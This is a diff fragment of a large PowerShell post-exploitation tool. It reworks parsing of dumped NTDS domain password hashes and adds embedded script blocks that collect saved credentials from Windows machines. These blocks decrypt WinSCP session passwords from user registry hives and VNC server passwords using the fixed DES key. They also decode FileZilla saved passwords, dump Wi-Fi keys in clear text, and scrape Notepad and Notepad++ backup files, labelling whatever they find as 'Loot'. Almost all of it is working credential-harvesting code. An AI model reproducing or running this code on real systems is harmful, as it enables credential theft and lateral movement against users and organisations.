-                    $computerHashes += $line
-                }
-                else {
-                    $userHashes += $line
-
-                    if ($hash -ne $null) {
-                        if (-not $identicalPasswordGroups.ContainsKey($hash)) {
-                            $identicalPasswordGroups[$hash] = @()
-                        }
-                        $identicalPasswordGroups[$hash] += $user
-                    }
-
-                    # Check if the previous line and the current line do not have two "::" in a row
-                    if (-not ($line -match ':::' -and $prevLine -match ':::')) {
-                        $samHashes += $line
-                    }
-                }
-
-                $prevLine = $line
-            }
-
-            $userHashes | Set-Content -Path (Join-Path $newDirectoryPath "UserHashes.txt")
-            $computerHashes | Set-Content -Path (Join-Path $newDirectoryPath "ComputerHashes.txt")
-            $emptyPasswordUsers | Set-Content -Path (Join-Path $newDirectoryPath "UsersWithEmptyPasswords.txt")
-
-            $groupNumber = 1
-            $groupedUsersContent = foreach ($group in $identicalPasswordGroups.GetEnumerator()) {
-                if ($group.Value.Count -gt 1) {
-                    $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
-                    $groupNumber++
-                    $groupContent
-                    Write-Output ""
-                }
-            }
-
-            $groupedUsersContent | Set-Content -Path (Join-Path $newDirectoryPath "GroupedUsersWithIdenticalPasswords.txt")
-
-            $newFileName = ".$computerName-NTDS-Full.txt"
-            Move-Item -Path $NTDSFile -Destination (Join-Path $newDirectoryPath $newFileName) -Force
-
-            # Write SAM hashes to SAMHashes.txt
-            $samHashes | Set-Content -Path (Join-Path $newDirectoryPath "SAMHashes.txt")
         }
 
-        Write-Output ""
-        Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
-        Write-host "Parsed NTDS files stored in $newDirectoryPath"
-
-        if ($Rainbow) {
-            RainbowCheck -Module "NTDS" -RCFilePath (Join-Path $newDirectoryPath "UserHashes.txt")
-
-        }
-
+        $groupedUsersContent | Set-Content -Path (Join-Path $UserData "4.Enabled-Users-With-Identical-Passwords.txt")
+        Move-Item $NTDS_File -Destination "$FullDump" -Force
     }
+
+            if ($Rainbow) {
+            RainbowCheck -Module "NTDS" -RCFilePath "$UserData\1.Enabled-User-Hashes.txt"
+        }
+
+    Write-Output ""
+    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "Parsed NTDS files stored in $NTDSDirectory"
+}
+
+
+
 
     ################################################################################################################
     ############################################## Function: Parse-SCCM ############################################
@@ -6889,7 +7209,7 @@ public class Advapi32 {
     if (!$NoParse) { if ($Module -eq "eKeys") { Parse-eKeys } }
     if (!$NoParse) { if ($Module -eq "LogonPasswords") { Parse-LogonPasswords } }
     if (!$NoParse) { if ($Module -eq "KerbDump") { Parse-KerbDump } }
-    if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS -DirectoryPath $NTDS } }
+    if (!$NoParse) { if ($Module -eq "NTDS") { Parse-NTDS} }
     if (!$NoParse) { if ($Module -eq "SCCM") { Parse-SCCM } }
 
     RestoreTicket
@@ -7152,6 +7472,540 @@ $Out = Invoke-LocalSCCM
 $Out | Out-string
 '@ 
 
+$Global:LocalWinSCP = @'
+
+function Get-MappedSID {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$Hive
+    )
+  
+    $SID = (Split-Path $Hive -Leaf)
+    $objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
+    return $objSID.Translate([System.Security.Principal.NTAccount])
+}
+  
+function Decrypt-NextCharacterWinSCP {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$RemainingPass,
+        [Parameter(Mandatory = $true)]
+        [int]$Magic
+    )
+  
+    $firstVal = ("0123456789ABCDEF".IndexOf($RemainingPass[0]) * 16)
+    $secondVal = "0123456789ABCDEF".IndexOf($RemainingPass[1])
+    $added = $firstVal + $secondVal
+  
+    $decryptedResult = (((-bnot ($added -bxor $Magic)) % 256) + 256) % 256
+  
+    return [PSCustomObject]@{
+        Flag          = $decryptedResult
+        RemainingPass = $RemainingPass.Substring(2)
+    }
+}
+  
+function Decrypt-WinSCPPassword {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$SessionHostname,
+        [Parameter(Mandatory = $true)]
+        [string]$SessionUsername,
+        [Parameter(Mandatory = $true)]
+        [string]$Password
+    )
+  
+    $CheckFlag = 255
+    $Magic = 163
+    $key = $SessionHostname + $SessionUsername
+  
+    $values = Decrypt-NextCharacterWinSCP -RemainingPass $Password -Magic $Magic
+    $storedFlag = $values.Flag
+  
+    if ($storedFlag -eq $CheckFlag) {
+        $values = Decrypt-NextCharacterWinSCP -RemainingPass $values.RemainingPass.Substring(2) -Magic $Magic
+    }
+  
+    $len = $values.Flag
+    $values = Decrypt-NextCharacterWinSCP -RemainingPass $values.RemainingPass -Magic $Magic
+    $values.RemainingPass = $values.RemainingPass.Substring($values.Flag * 2)
+  
+    $finalOutput = ""
+    for ($i = 0; $i -lt $len; $i++) {
+        $values = Decrypt-NextCharacterWinSCP -RemainingPass $values.RemainingPass -Magic $Magic
+        $finalOutput += [char]$values.Flag
+    }
+  
+    if ($storedFlag -eq $CheckFlag) {
+        return $finalOutput.Substring($key.Length)
+    }
+  
+    return $finalOutput
+}
+  
+function Invoke-WinSCPDecryptor {
+    param ()
+    [bool]$Loot = $false
+
+    $userHives = Get-ChildItem Registry::HKEY_USERS -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$' }
+  
+    foreach ($hive in $userHives) {
+        $objUser = Get-MappedSID -Hive $hive.Name
+        $source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)
+        $winSCPPath = Join-Path $hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
+  
+        if (Test-Path $winSCPPath) {
+            $allWinSCPSessions = Get-ChildItem $winSCPPath
+  
+            foreach ($session in $allWinSCPSessions) {
+                $pathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $session
+                $winSCPSessionObject = [PSCustomObject]@{
+                    User   = $source
+                    Session  = (Split-Path $session -Leaf)
+                    Hostname = (Get-ItemProperty -Path $pathToWinSCPSession -Name "HostName" -ErrorAction SilentlyContinue).HostName
+                    Username = (Get-ItemProperty -Path $pathToWinSCPSession -Name "UserName" -ErrorAction SilentlyContinue).UserName
+                    Password = (Get-ItemProperty -Path $pathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password
+                }
+  
+                if ($winSCPSessionObject.Password) {
+                    $masterPassUsed = (Get-ItemProperty -Path (Join-Path $hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword
+  
+                    if (!$masterPassUsed) {
+                        $winSCPSessionObject.Password = Decrypt-WinSCPPassword -SessionHostname $winSCPSessionObject.Hostname -SessionUsername $winSCPSessionObject.Username -Password $winSCPSessionObject.Password
+                    }
+                    else {
+                        $winSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
+                    }
+                }
+  
+                if ($winSCPSessionObject.Username -eq $null -and $winSCPSessionObject.Password -eq $null) {}
+                else { 
+                    $Loot = $true
+                    $winSCPSessionObject | Format-Table -AutoSize | Out-String
+                }
+            }
+        }
+    }
+    
+    if (!$Loot){return "No Results"}
+}
+  
+Invoke-WinSCPDecryptor
+
+'@
+
+$Global:LocalVNC = @'
+
+function VNC-Decrypt {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$Password
+    )
+    
+    # Convert the encrypted password from hex to bytes
+    $encryptedBytes = [byte[]]::new($Password.Length / 2)
+    for ($i = 0; $i -lt $Password.Length; $i += 2) {
+        $encryptedBytes[$i / 2] = [Convert]::ToByte($Password.Substring($i, 2), 16)
+    }
+    
+    # Fixed DES key and initialization vector (IV)
+    $desKey = [byte[]](0xe8, 0x4a, 0xd6, 0x60, 0xc4, 0x72, 0x1a, 0xe0)
+    
+    $des = [System.Security.Cryptography.DES]::Create()
+    $des.Key = $desKey
+    $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
+    $des.Padding = [System.Security.Cryptography.PaddingMode]::None
+    
+    # Ensure the encryptedBytes array length is a multiple of the block size (8 bytes)
+    if ($encryptedBytes.Length % 8 -ne 0) {
+        $paddedLength = [Math]::Ceiling($encryptedBytes.Length / 8) * 8
+        $paddedBytes = [byte[]]::new($paddedLength)
+        [Array]::Copy($encryptedBytes, $paddedBytes, $encryptedBytes.Length)
+        $encryptedBytes = $paddedBytes
+    }
+    
+    # Decrypt the encrypted bytes
+    $decryptor = $des.CreateDecryptor()
+    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
+    $decryptedPassword = ([System.Text.Encoding]::ASCII.GetString($decryptedBytes)).Trim([char]0)
+    $decryptedPassword = $decryptedPassword.Substring(0, [Math]::Min($decryptedPassword.Length, 8))
+    
+    return $decryptedPassword
+}
+
+function GetRegistryValue {
+    param (
+        [string]$Path,
+        [string]$Key
+    )
+    
+    try {
+        $regKey = Get-ItemProperty -Path "HKLM:\$Path" -Name $Key -ErrorAction Stop
+        $value = $regKey.$Key
+    
+        if ($value -is [byte[]]) {
+            # Convert REG_BINARY to a hexadecimal string
+            return [BitConverter]::ToString($value).Replace("-", "")
+        } else {
+            # Return REG_SZ or other types as is
+            return $value
+        }
+    } catch {
+        return $null
+    }
+}
+
+function Search-TightVNC-Passwords {
+    $TightVNCServerPassword = GetRegistryValue -Path "Software\TightVNC\Server" -Key "Password"
+    $TightVNCServerControlPassword = GetRegistryValue -Path "Software\TightVNC\Server" -Key "ControlPassword"
+    $TightVNCServerPasswordViewOnly = GetRegistryValue -Path "Software\TightVNC\Server" -Key "PasswordViewOnly"
+    
+    if ($TightVNCServerPassword -ne $null -or $TightVNCServerControlPassword -ne $null -or $TightVNCServerPasswordViewOnly -ne $null) {
+        try { $TightVNCServerPasswordPlaintext = VNC-Decrypt -Password $TightVNCServerPassword ; $T1 = $true } Catch { $T1 = $false }
+        try { $TightVNCServerControlPasswordPlaintext = VNC-Decrypt -Password $TightVNCServerControlPassword ; $T2 = $true } Catch { $T2 = $false }
+        try { $TightVNCServerPasswordViewOnlyPlaintext = VNC-Decrypt -Password $TightVNCServerPasswordViewOnly ; $T3 = $true } Catch { $T3 = $false }
+    
+        if ($T1 -or $T2 -or $T3) { Write-Output "[TightVNC]" ; Write-Output "========================================" }
+    
+        if ($T1) {
+            Write-Output "Encrypted Password : $TightVNCServerPassword"
+            Write-Output "Decrypted Password : $TightVNCServerPasswordPlaintext"
+        }
+    
+        if ($T2) {
+            Write-Output "Encrypted Password : $TightVNCServerControlPassword"
+            Write-Output "Decrypted Password : $TightVNCServerControlPasswordPlaintext"
+        }
+    
+        if ($T3) {
+            Write-Output "Encrypted Password : $TightVNCServerPasswordViewOnly"
+            Write-Output "Decrypted Password : $TightVNCServerPasswordViewOnlyPlaintext"
+        }
+    }
+}
+    
+function Search-RealVNC-Passwords {
+    $RealVNCProxyUser = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyUsername"
+    $RealVNCProxyServer = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyServer"
+    $RealVNCPassword = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyPassword"
+    
+    if ($RealVNCPassword) {
+        $RealVNCPlaintext = VNC-Decrypt -Password $RealVNCPassword
+        Write-Output "Proxy Server   : $RealVNCProxyServer"
+        Write-Output "Proxy Username : $RealVNCProxyUser"
+        Write-Output "Proxy Password : $RealVNCPlaintext"
+    }
+}
+    
+function Search-TigerVNC-Passwords {
+    $TigerVNCPPassword = GetRegistryValue -Path "SOFTWARE\TigerVNC\WinVNC4" -Key "Password"
+    if ($TigerVNCPPassword) {
+        $TigerVNCPPasswordPlaintext = VNC-Decrypt -Password $TigerVNCPPassword
+        Write-Output "Encrypted Password : $TigerVNCPPassword"
+        Write-Output "Decrypted Password : $TigerVNCPPasswordPlaintext"
+    }
+}
+    
+function Search-UltraVNC-Passwords {
+    param (
+        [string[]]$Paths
+    )
+    
+    $headerDisplayed = $false
+    $regexPatterns = @("passwd=[0-9A-F]+", "passwd2=[0-9A-F]+")
+
+    foreach ($path in $Paths) {
+        if (Test-Path $path) {
+            $fileContent = Get-Content -Path $path -Raw
+            foreach ($pattern in $regexPatterns) {
+                $matches = [regex]::Matches($fileContent, $pattern)
+                foreach ($match in $matches) {
+                    $encryptedPassword = $match.Value.Split('=')[-1]
+                    try {
+                        $decryptedPassword = VNC-Decrypt -Password $encryptedPassword
+                            
+                        if (-not $headerDisplayed) {
+                            $headerDisplayed = $true
+                        }
+                        Write-Output "Encrypted Password : $encryptedPassword"
+                        Write-Output "Decrypted Password : $decryptedPassword"
+                    }
+                    catch {
+                        if (-not $headerDisplayed) {
+                            $headerDisplayed = $true
+                        }
+                        Write-Output "Failed to decrypt password: $encryptedPassword"    
+                    }
+                }
+            }
+        }
+    }
+}
+
+# Define UltraVNC paths to search
+$UltraVNCPaths = @(
+    "$env:SystemDrive\Program Files (x86)\uvnc bvba\UltraVNC\ultravnc.ini",
+    "$env:SystemDrive\Program Files\uvnc bvba\UltraVNC\ultravnc.ini",
+    "$env:SystemDrive\Program Files\UltraVNC\ultravnc.ini",
+    "$env:SystemDrive\Program Files (x86)\UltraVNC\ultravnc.ini"
+)
+    
+function VNC-Hunt {
+    $Loot = $false
+
+    Write-Output ""
+
+    $realVNCResults = Search-RealVNC-Passwords
+    if ($realVNCResults -ne $null) {
+        $Loot = $true
+        Write-Output "[RealVNC]"
+        Write-Output "========================================"
+        $realVNCResults | ForEach-Object { Write-Output $_ }
+        Write-Output "========================================"
+        Write-Output ""
+    }
+
+    $tightVNCResults = Search-TightVNC-Passwords
+    if ($tightVNCResults -ne $null) {
+        $Loot = $true
+        $tightVNCResults | ForEach-Object { Write-Output $_ }
+        Write-Output "========================================"
+        Write-Output ""
+    }
+
+    $tigerVNCResults = Search-TigerVNC-Passwords
+    if ($tigerVNCResults -ne $null) {
+        $Loot = $true
+        Write-Output "[TigerVNC]"
+        Write-Output "========================================"
+        $tigerVNCResults | ForEach-Object { Write-Output $_ }
+        Write-Output "========================================"
+        Write-Output ""
+    }
+
+    $ultraVNCResults = Search-UltraVNC-Passwords -Paths $UltraVNCPaths
+    if ($ultraVNCResults -ne $null) {
+        $Loot = $true
+        Write-Output "[UltraVNC]"
+        Write-Output "========================================"
+        $ultraVNCResults | ForEach-Object { Write-Output $_ }
+        Write-Output "========================================"
+        Write-Output ""
+    }
+
+    if (-not $Loot) {
+        Write-Output "No Results"
+    }
+}
+
+VNC-Hunt
+
+
+'@
+
+$Global:LocalFileZilla = @'
+function Get-FileZillaCredentials {
+    $userProfilesPath = "C:\Users"
+    $filePaths = @(
+        "\AppData\Roaming\FileZilla\sitemanager.xml",
+        "\AppData\Roaming\FileZilla\recentservers.xml"
+    )
+
+    [bool]$Loot = $false
+    
+    $userProfiles = Get-ChildItem -Path $userProfilesPath | Where-Object { $_.PSIsContainer }
+
+    foreach ($userProfile in $userProfiles) {
+        foreach ($relativePath in $filePaths) {
+            $filePath = Join-Path -Path $userProfile.FullName -ChildPath $relativePath
+            if (Test-Path $filePath) {
+                $Loot = $true
+                Write-Output ""
+                Write-Output "Path: $filePath"
+                try {
+                    [xml]$fileContent = Get-Content -Path $filePath -ErrorAction Stop
+                } catch {
+                    continue
+                }
+
+                $servers = @()
+                if ($fileContent.FileZilla3.RecentServers.Server) {
+                    $servers += $fileContent.FileZilla3.RecentServers.Server
+                }
+                if ($fileContent.FileZilla3.Servers.Server) {
+                    $servers += $fileContent.FileZilla3.Servers.Server
+                }
+
+                foreach ($Server in $servers) {
+                    $hostName = $Server.Host
+                    $port = $Server.Port
+                    $userName = $Server.User
+                    $encodedPassword = $Server.Pass.'#text'
+
+                    try {
+                        if ($encodedPassword -ne "") {
+                            $password = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedPassword))
+                        } else {
+                            $password = "No password set"
+                        }
+                    }
+                    catch {
+                        $password = "Failed to decode base64 string"
+                    }
+
+                    Write-Output "==========================="
+                    Write-Output "Host: $hostName"
+                    Write-Output "Port: $port"
+                    Write-Output "User: $userName"
+                    Write-Output "Password: $password"
+                    Write-Output "==========================="
+                }
+            } 
+        }
+    }
+
+    if (-not $Loot) {
+        Write-Output "No Results"
+    }
+}
+
+Get-FileZillaCredentials
+
+
+'@
+
+$Global:LocalWifi = @'
+function Wifi-Dump {
+    $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object {
+        $_.Matches.Groups[1].Value.Trim()
+    }
+
+    $results = foreach ($profile in $wifiProfiles) {
+        $profileInfo = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content\W+:(.+)$"
+
+        if ($profileInfo) {
+            $password = $profileInfo.Matches.Groups[1].Value.Trim()
+            [PSCustomObject]@{
+                PROFILE_NAME = $profile
+                PASSWORD     = $password
+            }
+        }
+    }
+
+    if ($results) {
+        $results | Select-Object PROFILE_NAME, PASSWORD | Out-string | Write-Output
+    }
+    else {
+        return "No Results"
+    }
+}
+
+Wifi-Dump
+'@
+
+$Global:LocalNotepad = @'
+
+function DumpNotepad {
+
+    function Extract-Strings {
+        param (
+            [Parameter(Mandatory = $true)]
+            [ValidateScript({ Test-Path $_ -PathType 'Leaf' })]
+            [string]$FilePath,
+
+            [ValidateSet('Default', 'Ascii', 'Unicode')]
+            [string]$Encoding = 'Default',
+
+            [uint32]$MinimumLength = 3
+        )
+
+        $Results = @()
+
+        if ($Encoding -eq 'Unicode' -or $Encoding -eq 'Default') {
+            $UnicodeFileContents = [System.IO.File]::ReadAllText($FilePath, [System.Text.Encoding]::Unicode)
+            $UnicodeRegex = "[\u0020-\u007E]{$MinimumLength,}"
+            $Results += [regex]::Matches($UnicodeFileContents, $UnicodeRegex) | ForEach-Object { $_.Value }
+        }
+
+        if ($Encoding -eq 'Ascii' -or $Encoding -eq 'Default') {
+            $AsciiFileContents = [System.IO.File]::ReadAllBytes($FilePath)
+            $AsciiString = -join ($AsciiFileContents | ForEach-Object { [char]$_ })
+            $AsciiRegex = "[\x20-\x7E]{$MinimumLength,}"
+            $Results += [regex]::Matches($AsciiString, $AsciiRegex) | ForEach-Object { $_.Value }
+        }
+
+        $Results
+    }
+
+    function Get-UserProfilePaths {
+        (Get-ChildItem -Path "$env:SystemDrive\Users" | 
+            Where-Object { $_.BaseName -ne "Public" -and $_.BaseName -notlike "*defaultuser*" }
+        ).BaseName
+    }
+
+    function Get-NotePadPlusPlus {
+        param (
+            [string]$UserProfile
+        )
+
+        $RootPath = "$env:SystemDrive\Users\$UserProfile\APPDATA\Roaming\NotePad++\backup\"
+        $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
+
+        foreach ($BackupFile in $BackupFiles) {
+            $FullPath = $BackupFile.FullName
+            $Content = Get-Content -Raw -Path $FullPath
+            #Write-Output "========================================================================================="
+            Write-Output "File Name: $($BackupFile.Name)"
+            Write-Output ""
+            Write-Output $Content
+            Write-Output "========================================================================================="
+        }
+    }
+
+    function Get-Notepad {
+        param (
+            [string]$UserProfile
+        )
+
+        $PackagesPath = "$env:SystemDrive\Users\$UserProfile\AppData\Local\Packages"
+        $NotepadPath = Get-ChildItem -Path $PackagesPath -Filter "Microsoft.WindowsNotepad_*" -Directory -ErrorAction "SilentlyContinue" | Select-Object -First 1
+
+        if ($NotepadPath) {
+            $RootPath = "$($NotepadPath.FullName)\LocalState\TabState\"
+            $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
+
+            foreach ($BackupFile in $BackupFiles) {
+                $FullPath = $BackupFile.FullName
+                $Content = Extract-Strings -FilePath $FullPath
+                #Write-Output "========================================================================================="
+                Write-Output "File Name: $($BackupFile.Name)"
+                Write-Output ""
+                Write-Output $Content
+                Write-Output "========================================================================================="
+            }
+        } 
+    }
+
+    $UserProfiles = Get-UserProfilePaths
+
+    foreach ($UserProfile in $UserProfiles) {
+        Get-NotePadPlusPlus -UserProfile $UserProfile
+    }
+
+
+    foreach ($UserProfile in $UserProfiles) {
+        Get-Notepad -UserProfile $UserProfile
+    }
+}
+
+$Loot = DumpNotepad
+if (!$Loot){Write-Output "No Results"} else {
+                Write-Output "========================================================================================="
+$Loot | Write-Output
+                Write-Output "========================================================================================="
+}
+
+'@
 
 
 # Highly compressed revision of this script: https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1
